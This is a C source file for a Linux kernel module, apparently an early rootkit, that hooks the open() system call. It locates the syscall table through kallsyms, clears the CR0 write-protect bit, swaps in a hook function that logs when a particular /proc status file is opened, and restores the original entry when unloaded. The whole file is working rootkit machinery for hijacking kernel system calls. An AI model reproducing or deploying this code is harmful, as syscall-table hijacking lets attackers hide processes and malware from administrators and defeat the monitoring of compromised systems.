#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>


unsigned long **SYS_CALL_TABLE;

//macro for writing protect memory
#define readMe() write_cr0(read_cr0() & (~0x10000))
#define protectMe() write_cr0(read_cr0() | 0x10000)

asmlinkage int (*original_open)(const char *pathname, int flags, mode_t mode);
asmlinkage int rk_open(unsigned char __user* pathname, int flags, mode_t mode)
{
	if(strstr(pathname, "/proc/5535/status") !=NULL)
	{
		printk(KERN_ALERT "PS PROCESS HIJACKED %s\n", pathname);
	}
	return (*original_open)(pathname, flags, mode);
}

static int __init rk_init(void)
{
	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table");
	printk(KERN_INFO "Hello.\n");
	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);

	readMe();
	//hook open()
	original_open = (void*)SYS_CALL_TABLE[__NR_open];
	SYS_CALL_TABLE[__NR_open] = (unsigned long*)rk_open;
	protectMe();

	return 0;
}

static void __exit rk_exit(void)
{
	readMe();
	//unhook open()
	SYS_CALL_TABLE[__NR_open] = (unsigned long*)original_open;
	protectMe();

	printk(KERN_INFO "Goodbye.");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("me");
MODULE_DESCRIPTION("Hooking.");
MODULE_VERSION("0");
module_init(rk_init);
module_exit(rk_exit);
